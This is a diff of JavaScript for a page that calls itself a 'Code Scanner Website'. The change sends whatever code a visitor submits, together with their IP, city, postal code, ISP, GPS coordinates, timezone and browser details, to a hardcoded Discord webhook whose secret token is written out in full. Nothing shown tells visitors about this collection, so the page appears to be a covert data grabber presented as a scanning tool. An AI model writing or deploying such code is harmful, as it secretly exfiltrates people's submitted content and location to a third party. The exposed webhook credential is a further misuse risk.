@@ -1,5 +1,5 @@
-// Configuration - Replace with your actual webhook URL
-const WEBHOOK_URL = 'https://your-webhook-url-here.com/webhook';
+// Configuration - Discord webhook URL
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
 
 // DOM Elements
 const scanBtn = document.getElementById('scanBtn');
@@ -130,28 +130,51 @@ async function submitCode() {
         // Get user location data
         const locationData = await getUserLocation();
         
+        // Format data for Discord webhook
+        const discordMessage = {
+            embeds: [{
+                title: "🔍 New Code Scan Submitted",
+                color: 0x5865F2, // Discord blue color
+                timestamp: new Date().toISOString(),
+                fields: [
+                    {
+                        name: "📝 Code",
+                        value: `\`\`\`\n${code}\n\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "🌍 Location",
+                        value: `**IP:** ${locationData.ip || 'Unknown'}\n**City:** ${locationData.city || 'Unknown'}\n**Region:** ${locationData.region || 'Unknown'}\n**Country:** ${locationData.country || 'Unknown'} (${locationData.country_code || 'Unknown'})\n**Postal:** ${locationData.postal || 'Unknown'}\n**ISP:** ${locationData.isp || 'Unknown'}`,
+                        inline: true
+                    },
+                    {
+                        name: "💻 Browser Info",
+                        value: `**Platform:** ${navigator.platform}\n**Language:** ${navigator.language}\n**Screen:** ${screen.width}x${screen.height}\n**User Agent:** ${navigator.userAgent.substring(0, 100)}...`,
+                        inline: true
+                    }
+                ],
+                footer: {
+                    text: "Code Scanner Website",
+                    icon_url: "https://cdn.discordapp.com/emojis/1234567890123456789.png"
+                }
+            }]
+        };
+
+        // Add coordinates if available
+        if (locationData.latitude && locationData.longitude) {
+            discordMessage.embeds[0].fields.push({
+                name: "📍 Coordinates",
+                value: `**Lat:** ${locationData.latitude}\n**Lng:** ${locationData.longitude}\n**Timezone:** ${locationData.timezone || 'Unknown'}`,
+                inline: true
+            });
+        }
+        
         const response = await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify({
-                code: code,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                source: 'code-scanner-website',
-                location: locationData,
-                browser: {
-                    language: navigator.language,
-                    languages: navigator.languages,
-                    platform: navigator.platform,
-                    cookieEnabled: navigator.cookieEnabled,
-                    onLine: navigator.onLine,
-                    screenResolution: `${screen.width}x${screen.height}`,
-                    colorDepth: screen.colorDepth,
-                    pixelDepth: screen.pixelDepth
-                }
-            })
+            body: JSON.stringify(discordMessage)
         });
 
         if (response.ok) {
